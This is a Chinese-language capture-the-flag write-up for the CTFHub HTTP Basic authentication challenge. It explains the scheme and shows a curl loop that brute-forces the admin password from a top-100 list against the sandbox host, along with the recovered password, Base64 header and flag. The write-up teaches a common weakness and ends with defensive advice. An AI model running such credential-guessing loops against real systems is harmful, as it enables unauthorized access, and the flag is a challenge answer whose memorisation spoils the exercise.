# CTFHub Writeup - 基本认证 

## 题目类型

WEB

## 题目描述

打开题目，点开链接

页面出现一个页面标题：CTFHub 基础认证

标题下面的页面文字为：

Here is your flag: click，其中 click 是超链接

## 漏洞原理

HTTP Basic 认证

HTTP Basic 认证是最简单的一种认证方案，流程如下：

第 1 步：客户端请求受保护资源，服务端返回 401 Unauthorized，并带上：

WWW-Authenticate: Basic realm="Do u know admin ?"

第 2 步：浏览器弹出登录框，用户输入用户名和密码后，浏览器把 用户名:密码 用 Base64 编码，放进请求头：

Authorization: Basic YWRtaW46cm9iZXJ0

第 3 步：服务端解码后比对凭据，正确则返回 200，否则再次 401。

它有两个天然弱点：

Base64 只是编码，不是加密，可以瞬间还原出明文口令；
 
如果走 HTTP 明文传输，凭据在网络中完全裸奔；即使走 HTTPS，弱口令也挡不住暴力破解。

本题的 realm 直接写成 Do u know admin ?，等于把用户名 admin 告诉了攻击者，剩下的只是猜密码。

## 解题过程

信息收集

访问首页：

<h1>CTFHub 基础认证</h1>
<div>
Here is your flag: <a href="/flag.html">click</a>
</div>

顺着链接请求 /flag.html，得到 401：
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Do u know admin ?"
Content-Type: text/html; charset=utf-8

两个信息非常关键：

认证方式是 Basic；

realm 里写着 admin，结合题目附件通常只给密码字典，可以确定用户名为 admin。

准备字典

CTFHub 这道题正常会提供一个附件，文件名类似 10_million_password_list_top_100，即「1000万密码列表」中出现频率最高的前 100 个密码。

题目设计意图很明确：用户名已知、密码在字典里，做一次定向爆破。

字典开头大致是

123456
password
12345678
qwerty
123456789
...

爆破

最直接的方式是用 curl 循环，逐个尝试 admin:<密码>，只要状态码从 401 变成 200 就命中：

for p in $(cat top100.txt); do
code=$(curl -s -o /dev/null -w "%{http_code}" -u "admin:$p" \
"http://challenge-948763620edbde04.sandbox.ctfhub.com:10800/flag.html")
echo "$p -> $code"
[ "$code" = "200" ] && break
done

本题的命中结果是：

robert -> 200

即第 53 个密码 robert 就是正确口令：

用户名：admin
密 码：robert

携带凭据取得 Flag

用 curl 的 -u 参数会自动完成 Base64 编码：

curl -s -u "admin:robert" \

"http://challenge-948763620edbde04.sandbox.ctfhub.com:10800/flag.html"

响应：

ctfhub{bd8e694a47b3388721250cb8}

也可以手工构造请求头，效果完全一致：

# "admin:robert" 的 Base64

echo -n "admin:robert" | base64 # YWRtaW46cm9iZXJ0

curl -s -H "Authorization: Basic YWRtaW46cm9iZXJ0" \"http://challenge-948763620edbde04.sandbox.ctfhub.com:10800/flag.html

## 踩坑记录

1.先试常见弱口令容易误判：admin/admin、admin/123456、admin/password 全部 401，容易让人以为不是弱口令题。

实际答案在 top100 的第 53 位 robert，只试前 20 个是碰不到的——必须把字典跑完。

2.Base64 编码的对象是 用户名:密码 整体：不是只编码密码。Burp 里要加 admin: 前缀后再一起编
码。

3.Burp 的 URL-encode 会把 = 变成 %3d：Base64 末尾常有 =，必须取消 URL 编码，否则服务端
解不出来。

4. 浏览器缓存凭据：输错一次后浏览器会记住，建议用无痕窗口或直接 curl，避免被缓存干扰判断。

5. 用户名不是靠猜：realm="Do u know admin ?"

已经明示 admin，题目附件也只提供密码字典，不要浪费时间爆破用户名。

6.HTTP 明文传输：如果抓包环境里还有代理，注意 Basic 凭据会以 Base64 形式明文出现在Authorization 头里，这也是本题「基础认证不安全」的直观体现。

## 总结

本题是 HTTP Basic 认证的入门题，核心链路只有三步：

访问 /flag.html → 401 + realm 泄露用户名 admin

→ 用 top100 字典定向爆破密码
→ admin:robert → 200，拿到 flag

它说明了一个朴素但重要的道理：

认证的安全性最终取决于口令强度。

Basic 认证把 用户名:密码 用Base64 裸奔在请求头里，一旦口令是字典里的高频词，攻击者只需要几百次请求就能拿下。

工程上应当用强口令策略、失败锁定、HTTPS 和更现代的认证方案来兜底。
